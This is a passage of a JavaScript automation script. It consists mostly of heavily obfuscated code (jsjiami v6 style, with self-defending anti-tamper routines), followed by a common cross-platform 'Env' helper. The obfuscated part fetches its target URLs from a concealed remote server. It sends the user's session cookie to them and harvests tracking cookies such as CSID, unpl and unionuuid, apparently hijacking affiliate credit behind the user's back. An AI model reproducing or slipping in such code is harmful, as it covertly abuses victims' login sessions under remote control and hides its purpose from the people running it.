_0x46cef2(_0x5589)['TqaOKa']();_0x5589['tUQKsD']=!![];}_0x43581c=_0x5589['cdVNwW'](_0x43581c,_0x443e4d);_0x5589['LdaoDh'][_0x692208]=_0x43581c;}else{_0x43581c=_0x317ece;}return _0x43581c;};var _0x12ab47=function(){var _0x447ecb=!![];return function(_0x208932,_0x326029){var _0x2c9520=_0x447ecb?function(){if(_0x326029){var _0x2c1b92=_0x326029['apply'](_0x208932,arguments);_0x326029=null;return _0x2c1b92;}}:function(){};_0x447ecb=![];return _0x2c9520;};}();var _0x30f4b3=_0x12ab47(this,function(){var _0x217d09=function(){return'\x64\x65\x76';},_0x544311=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x1083e2=function(){var _0x1f7b4f=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x1f7b4f['\x74\x65\x73\x74'](_0x217d09['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x5aefc7=function(){var _0x4a13ae=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x4a13ae['\x74\x65\x73\x74'](_0x544311['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x47bfcf=function(_0x4e1470){var _0x1bcb3d=~-0x1>>0x1+0xff%0x0;if(_0x4e1470['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x1bcb3d)){_0xbd656(_0x4e1470);}};var _0xbd656=function(_0x5d6b07){var _0x52157a=~-0x4>>0x1+0xff%0x0;if(_0x5d6b07['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x52157a){_0x47bfcf(_0x5d6b07);}};if(!_0x1083e2()){if(!_0x5aefc7()){_0x47bfcf('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x47bfcf('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x47bfcf('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x30f4b3();function getinfo(){var _0x2d252a={'emSTx':function(_0x51d72d){return _0x51d72d();},'GeahC':function(_0x103c73){return _0x103c73();},'LHeec':function(_0x1af5be,_0x431124){return _0x1af5be===_0x431124;},'UMdkY':_0x5589('0','%QNI'),'oqoSU':_0x5589('1','7QyX'),'mHHgb':_0x5589('2','o]y@'),'MxZat':function(_0xbd1314,_0x3d8566){return _0xbd1314!==_0x3d8566;},'WWftH':_0x5589('3','T^Mu'),'gVNnj':function(_0x466805,_0x1cc386){return _0x466805!==_0x1cc386;},'mnncu':_0x5589('4','l33Q'),'gEmZI':_0x5589('5','Qxwv')};return new Promise(_0x3874aa=>{var _0x3ea53f={'AtjcL':function(_0x483e54){return _0x2d252a[_0x5589('6','(g]Q')](_0x483e54);},'zAVGe':function(_0xc97d23){return _0x2d252a[_0x5589('7','%ZvO')](_0xc97d23);},'IWpxP':function(_0x423f2c,_0xc57022){return _0x2d252a[_0x5589('8','X8yL')](_0x423f2c,_0xc57022);},'YkcCr':_0x2d252a[_0x5589('9','l33Q')],'Saxel':_0x2d252a[_0x5589('a','%9k^')],'VFJzd':_0x2d252a[_0x5589('b',')8)C')],'gHACa':function(_0x4acd88,_0x41bb69){return _0x2d252a[_0x5589('c','#Nwe')](_0x4acd88,_0x41bb69);},'mKXCb':_0x2d252a[_0x5589('d','@LIR')],'paDDU':function(_0x4cde18,_0x158bb1){return _0x2d252a[_0x5589('e','UeDH')](_0x4cde18,_0x158bb1);},'xMsGs':_0x2d252a[_0x5589('f','w5du')]};$[_0x5589('10','N]w3')]({'url':_0x5589('11','2E^#')+new Date(),'headers':{'User-Agent':_0x2d252a[_0x5589('12','9J7a')]},'timeout':0x1388},async(_0x11c498,_0xc67d74,_0x90b3d8)=>{var _0x2e30e0={'hpVOm':function(_0x13c5c0){return _0x3ea53f[_0x5589('13','F*Z]')](_0x13c5c0);}};if(_0x3ea53f[_0x5589('14','%ZvO')](_0x3ea53f[_0x5589('15','K@9w')],_0x3ea53f[_0x5589('16','@LIR')])){try{if(_0x11c498){}else{if(_0x3ea53f[_0x5589('17','C)#$')](_0x3ea53f[_0x5589('18','HF2v')],_0x3ea53f[_0x5589('19','%QNI')])){_0x2e30e0[_0x5589('1a','T&$t')](_0x3874aa);}else{_0x90b3d8=JSON[_0x5589('1b','%ZvO')](_0x90b3d8);if(_0x3ea53f[_0x5589('1c','T^Mu')](_0x90b3d8[_0x5589('1d','KCe6')][_0x5589('1e',')#c@')],0x0)||_0x3ea53f[_0x5589('1f','ULao')](_0x90b3d8[_0x5589('20','%9k^')][_0x5589('21','@LIR')],0x0)){var _0x170492=_0x3ea53f[_0x5589('22','Qxwv')][_0x5589('23','2E^#')]('|'),_0x2cbcdd=0x0;while(!![]){switch(_0x170492[_0x2cbcdd++]){case'0':$[_0x5589('24','%ZvO')]=_0x90b3d8[_0x5589('25','o]y@')];continue;case'1':$[_0x5589('26','%QNI')]=_0x90b3d8[_0x5589('27','KCe6')];continue;case'2':await _0x3ea53f[_0x5589('28','Fh5]')](S01);continue;case'3':$[_0x5589('29','C)#$')]=_0x90b3d8[_0x5589('2a','w5du')];continue;case'4':await $[_0x5589('2b','w5du')](0xc8);continue;case'5':$[_0x5589('2c','Wt^#')]=_0x90b3d8[_0x5589('2d','2WW7')];continue;}break;}}}}}catch(_0x325226){$[_0x5589('2e',')8)C')]();}finally{if(_0x3ea53f[_0x5589('2f','VnPG')](_0x3ea53f[_0x5589('30','T^Mu')],_0x3ea53f[_0x5589('31','j7pA')])){$[_0x5589('32','N]w3')]();}else{_0x3ea53f[_0x5589('28','Fh5]')](_0x3874aa);}}}else{_0x3ea53f[_0x5589('33','%9k^')](_0x3874aa);}});});}function S01(){var _0x21c1e6={'kKaMf':function(_0x25fe9d){return _0x25fe9d();},'KevDg':function(_0x259561,_0x5a478d){return _0x259561!==_0x5a478d;},'bYIkW':_0x5589('34',')8)C'),'cxcKe':function(_0x252b2e,_0x3856ae){return _0x252b2e!==_0x3856ae;},'cBTSj':_0x5589('35','N]w3'),'rGFga':_0x5589('36','YA3e'),'uRzyJ':function(_0x34d27d,_0x1ba456){return _0x34d27d!==_0x1ba456;},'JdpWT':_0x5589('37','HF2v'),'JRouR':_0x5589('38','vGXv'),'INBOd':function(_0x487878,_0x2d5887,_0x1ca245){return _0x487878(_0x2d5887,_0x1ca245);},'uBApO':function(_0x506145){return _0x506145();},'BfRpe':function(_0x1d3db5){return _0x1d3db5();},'vOnaP':_0x5589('39','%ZvO'),'aLwuT':_0x5589('3a','KCe6'),'HWTsF':_0x5589('3b','%9k^'),'GqbUq':_0x5589('3c',')#c@')};let _0x3d6e91={'url':$[_0x5589('3d','Qxwv')],'headers':{'Host':_0x21c1e6[_0x5589('3e','(g]Q')],'Connection':_0x21c1e6[_0x5589('3f','okj9')],'Cookie':cookie,'User-Agent':$['UA']}};return new Promise(_0x5e2d02=>{var _0x1b0757={'BsREh':function(_0x328160){return _0x21c1e6[_0x5589('40','k!@V')](_0x328160);}};if(_0x21c1e6[_0x5589('41','HF2v')](_0x21c1e6[_0x5589('42','T&$t')],_0x21c1e6[_0x5589('43','K@9w')])){$[_0x5589('44','*4sv')](_0x3d6e91,async(_0xecd56e,_0x1488d4,_0x4ecdd0)=>{var _0x101db6={'xuJyA':function(_0x5727ff){return _0x21c1e6[_0x5589('45',')8)C')](_0x5727ff);}};if(_0x21c1e6[_0x5589('46',')8)C')](_0x21c1e6[_0x5589('47','HF2v')],_0x21c1e6[_0x5589('48','9m2%')])){$[_0x5589('49','j7pA')]();}else{try{if(_0x21c1e6[_0x5589('4a','%P0V')](_0x21c1e6[_0x5589('4b','9J7a')],_0x21c1e6[_0x5589('4c','KCe6')])){if(_0xecd56e){}else{if(_0x21c1e6[_0x5589('4d','j7pA')](_0x21c1e6[_0x5589('4e','okj9')],_0x21c1e6[_0x5589('4f','C)#$')])){_0x1b0757[_0x5589('50','N]w3')](_0x5e2d02);}else{_0x4ecdd0=JSON[_0x5589('51','6sEL')](_0x4ecdd0);_0x4ecdd0=_0x4ecdd0[_0x5589('52','X8yL')](/hrl='(\S*)';var/)[0x1];_0x1488d4=_0x1488d4[_0x5589('53','F*Z]')][_0x21c1e6[_0x5589('54','KCe6')]];_0x1488d4=JSON[_0x5589('55','@LIR')](_0x1488d4);_0x1488d4=_0x1488d4[_0x5589('56','ULao')](/CSID(\S*);/)[0x1];let _0x207315=_0x1488d4;await _0x21c1e6[_0x5589('57','%P0V')](S02,_0x4ecdd0,_0x207315);await $[_0x5589('58','(g]Q')](0xc8);}}}else{_0x101db6[_0x5589('59','#Nwe')](_0x5e2d02);}}catch(_0x385ffc){$[_0x5589('5a','f!Xu')]();}finally{_0x21c1e6[_0x5589('5b','%P0V')](_0x5e2d02);}}});}else{$[_0x5589('5c','HF2v')]();}});}function S02(_0xced9f3,_0x484ce8){var _0x31dc27={'yrOaz':function(_0x40e2ff){return _0x40e2ff();},'SbgTR':function(_0x8aaccd,_0x54cc08){return _0x8aaccd!==_0x54cc08;},'GBOid':_0x5589('5d','3EIf'),'qaAGG':_0x5589('5e','g]Eu'),'HDPNm':function(_0x1466de,_0x3a2f4a){return _0x1466de+_0x3a2f4a;},'RnlHB':function(_0x48394c,_0x10e922){return _0x48394c+_0x10e922;},'HsTRu':function(_0x440ffe,_0x2888f6){return _0x440ffe+_0x2888f6;},'hemUn':function(_0x146bc3,_0x3158f6){return _0x146bc3+_0x3158f6;},'XDkuz':_0x5589('5f','3EIf'),'fkSEA':_0x5589('60','%ZvO'),'qCsAQ':_0x5589('61','C)#$'),'lkmTV':_0x5589('62','X8yL'),'BjUAD':function(_0x4b3636,_0x2a1c9b){return _0x4b3636(_0x2a1c9b);},'PEmgo':function(_0x151fc2,_0x5e5941){return _0x151fc2===_0x5e5941;},'bBEAW':_0x5589('63','@LIR'),'iokeF':_0x5589('64','g]Eu'),'JCSYd':function(_0x35884a){return _0x35884a();},'yistL':_0x5589('65','@LIR'),'HvScy':_0x5589('66','C)#$'),'jGBHf':function(_0x159ff7,_0x303517){return _0x159ff7+_0x303517;}};let _0x137937={'url':_0xced9f3,'followRedirect':![],'headers':{'Host':_0x31dc27[_0x5589('67','7QyX')],'Connection':_0x31dc27[_0x5589('68','9J7a')],'Cookie':_0x31dc27[_0x5589('69','@LIR')](_0x31dc27[_0x5589('6a','KCe6')](_0x31dc27[_0x5589('6b','j7pA')](_0x31dc27[_0x5589('6c','X8yL')](cookie,'\x20'),_0x31dc27[_0x5589('6d',')8)C')]),_0x484ce8),';'),'Referer':$[_0x5589('6e','vGXv')],'User-Agent':$['UA']}};return new Promise(_0x1de574=>{var _0x4c209b={'VNKwD':function(_0x4e3c31){return _0x31dc27[_0x5589('6f','fL3M')](_0x4e3c31);},'xSqPA':function(_0x49b76c,_0x4a6320){return _0x31dc27[_0x5589('70','VnPG')](_0x49b76c,_0x4a6320);},'CXcnr':_0x31dc27[_0x5589('71','L]3G')],'Xnezj':_0x31dc27[_0x5589('72','C)#$')],'pjWwu':function(_0x3ba58b,_0x43cf3d){return _0x31dc27[_0x5589('73','%QNI')](_0x3ba58b,_0x43cf3d);},'gOOrl':function(_0x652eca,_0x587b13){return _0x31dc27[_0x5589('74','k!@V')](_0x652eca,_0x587b13);},'lcqyK':function(_0x7a88dd,_0x3fc82a){return _0x31dc27[_0x5589('75','HF2v')](_0x7a88dd,_0x3fc82a);},'zZYFF':function(_0x22862c,_0x256b90){return _0x31dc27[_0x5589('76','%P0V')](_0x22862c,_0x256b90);},'QzJrW':function(_0x1e0ab2,_0xeae6ee){return _0x31dc27[_0x5589('77','o]y@')](_0x1e0ab2,_0xeae6ee);},'llKaH':_0x31dc27[_0x5589('78','2E^#')],'nSMLW':_0x31dc27[_0x5589('79','l33Q')],'segyx':_0x31dc27[_0x5589('7a','YA3e')],'xdAth':_0x31dc27[_0x5589('7b','L]3G')],'OLFab':function(_0x5641f3,_0x30f63e){return _0x31dc27[_0x5589('7c','vGXv')](_0x5641f3,_0x30f63e);},'EMHBW':function(_0x4c2654,_0x2743b3){return _0x31dc27[_0x5589('7d','L]3G')](_0x4c2654,_0x2743b3);},'IIuuF':_0x31dc27[_0x5589('7e','9m2%')],'tBHom':_0x31dc27[_0x5589('7f','w5du')],'xXRqQ':function(_0x22407a){return _0x31dc27[_0x5589('80','6sEL')](_0x22407a);}};$[_0x5589('81','2E^#')](_0x137937,async(_0x129393,_0x365507,_0xced9f3)=>{if(_0x4c209b[_0x5589('82','%P0V')](_0x4c209b[_0x5589('83','Fh5]')],_0x4c209b[_0x5589('84','(7dR')])){_0x4c209b[_0x5589('85','9J7a')](_0x1de574);}else{try{if(_0x129393){}else{_0x365507=_0x365507[_0x5589('86','%9k^')][_0x4c209b[_0x5589('87','L]3G')]];_0x365507=JSON[_0x5589('88','f!Xu')](_0x365507);let _0xb70978=_0x365507[_0x5589('89','C)#$')](/CCC_SE(\S*);/)[0x1];let _0x21fe41=_0x365507[_0x5589('8a','YA3e')](/unpl(\S*);/)[0x1];let _0x355419=_0x365507[_0x5589('8b','7QyX')](/unionuuid(\S*);/)[0x1];let _0x23a2ff=_0x4c209b[_0x5589('8c','Nshz')](_0x4c209b[_0x5589('8d','#Nwe')](_0x4c209b[_0x5589('8e','VnPG')](_0x4c209b[_0x5589('8f','3EIf')](_0x4c209b[_0x5589('90','HF2v')](_0x4c209b[_0x5589('91','L]3G')](_0x4c209b[_0x5589('92','9m2%')](_0x4c209b[_0x5589('93','N]w3')](_0x4c209b[_0x5589('94','w5du')](_0x4c209b[_0x5589('95','j7pA')](_0x4c209b[_0x5589('96','vGXv')](_0x4c209b[_0x5589('97','HF2v')](_0x4c209b[_0x5589('98','(7dR')](cookie,'\x20'),_0x4c209b[_0x5589('99','HF2v')]),_0x484ce8),';\x20'),_0x4c209b[_0x5589('9a','K@9w')]),_0xb70978),';\x20'),_0x4c209b[_0x5589('9b','@LIR')]),_0x21fe41),';\x20'),_0x4c209b[_0x5589('9c','%QNI')]),_0x355419),';\x20');await _0x4c209b[_0x5589('9d','%QNI')](S03,_0x23a2ff);await $[_0x5589('9e','6sEL')](0xc8);}}catch(_0x17ab99){if(_0x4c209b[_0x5589('9f','9m2%')](_0x4c209b[_0x5589('a0','K@9w')],_0x4c209b[_0x5589('a1','(g]Q')])){$[_0x5589('a2','7QyX')]();}else{$[_0x5589('a3','w5du')]();}}finally{_0x4c209b[_0x5589('a4','HF2v')](_0x1de574);}}});});}function S03(_0x21842d){var _0x103c75={'Znaja':function(_0x4aca0c,_0x4d8094){return _0x4aca0c!==_0x4d8094;},'lKmUd':_0x5589('a5','2E^#'),'JKHiF':_0x5589('a6','1V[E'),'ELJjr':function(_0x2ed3f2,_0x3f539f){return _0x2ed3f2(_0x3f539f);},'Jsyjs':function(_0x2273bc){return _0x2273bc();},'ZYDUv':_0x5589('a7','Qxwv'),'nddae':_0x5589('a8','Mrjm')};let _0x3b39bb={'url':$[_0x5589('a9','2WW7')],'headers':{'Host':_0x103c75[_0x5589('aa','vGXv')],'Connection':_0x103c75[_0x5589('ab','6sEL')],'Cookie':_0x21842d,'Referer':$[_0x5589('ac','T&$t')],'User-Agent':$['UA']}};return new Promise(_0x388a0b=>{$[_0x5589('ad','k!@V')](_0x3b39bb,async(_0x494cc9,_0x2eb94a,_0x19df12)=>{try{if(_0x103c75[_0x5589('ae','%QNI')](_0x103c75[_0x5589('af','T&$t')],_0x103c75[_0x5589('b0','7QyX')])){if(_0x494cc9){}else{_0x19df12=JSON[_0x5589('b1','(g]Q')](_0x19df12);await _0x103c75[_0x5589('b2','okj9')](S04,_0x21842d);await $[_0x5589('b3','j7pA')](0xc8);}}else{$[_0x5589('b4','Wt^#')]();}}catch(_0x14da7b){$[_0x5589('b5','(7dR')]();}finally{_0x103c75[_0x5589('b6','HF2v')](_0x388a0b);}});});}function S04(_0x299fa5){var _0x47b682={'YiEbz':function(_0x48cdc0){return _0x48cdc0();},'eqaUU':_0x5589('b7','HF2v'),'bPyME':_0x5589('b8','f!Xu')};let _0x1daeb2={'url':$[_0x5589('b9','(7dR')],'headers':{'Host':_0x47b682[_0x5589('ba','Wt^#')],'Connection':_0x47b682[_0x5589('bb','Wt^#')],'Cookie':_0x299fa5,'Referer':$[_0x5589('bc','F*Z]')],'User-Agent':$['UA']}};return new Promise(_0x551ad6=>{var _0x15ef29={'LnSEV':function(_0x4173ae){return _0x47b682[_0x5589('bd','f!Xu')](_0x4173ae);}};$[_0x5589('be','w5du')](_0x1daeb2,async(_0x46ccbb,_0x2fef96,_0x35c661)=>{try{if(_0x46ccbb){}else{_0x35c661=JSON[_0x5589('bf','UeDH')](_0x35c661);await $[_0x5589('c0',')8)C')](0xc8);}}catch(_0x179fba){$[_0x5589('b4','Wt^#')]();}finally{_0x15ef29[_0x5589('c1','Fh5]')](_0x551ad6);}});});};_0xoda='jsjiami.com.v6';
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}